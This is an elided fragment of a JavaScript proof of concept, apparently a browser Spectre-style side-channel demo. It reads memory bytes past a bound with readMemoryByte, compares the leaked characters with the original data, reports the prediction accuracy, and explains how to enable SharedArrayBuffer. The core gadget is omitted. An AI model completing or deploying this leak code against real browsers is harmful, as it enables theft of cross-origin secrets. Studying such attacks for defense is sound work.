...
//    const worker = new Worker('timer.js');
    ...
    worker.onmessage = function(msg)
    {
        ...
        // leak data
        log("Working on caches....");
		var count = 0;
        for (var i = 0; i < data_array.length; i++)
        {
			var data = readMemoryByte(BOUNDARY+i);
            worker.terminate();
            //log("leak off=0x" + (BOUNDARY+i).toString(16) + ", byte=0x" + data.toString(16) + " '" + String.fromCharCode(data) + "'" +                ((data != data_array[i]) ? " (error)" : ""));
            log("Orginal Character: '" + String.fromCharCode(data_array[i])+ "', Predicted Character '" + String.fromCharCode(data) + "'" +
                ((data != data_array[i]) ? " (Incorrect)" : ""));
		...
		log("Predict Percentage: " + (count/data_array.length)*100 + "%");
        worker.terminate();
...
function main(string)
{
    ...
    {
        log("Status: SharedArrayBuffer is enabled. ");
    ...
    {
        log("Shared Array Buffer is not activated in the browser: In chrome, you have to go to URL: chrome://flags, search for SharedArrayBuffer and enable the feature. To change such preferences in Firefox, you have to visit about:config.");
    }
}
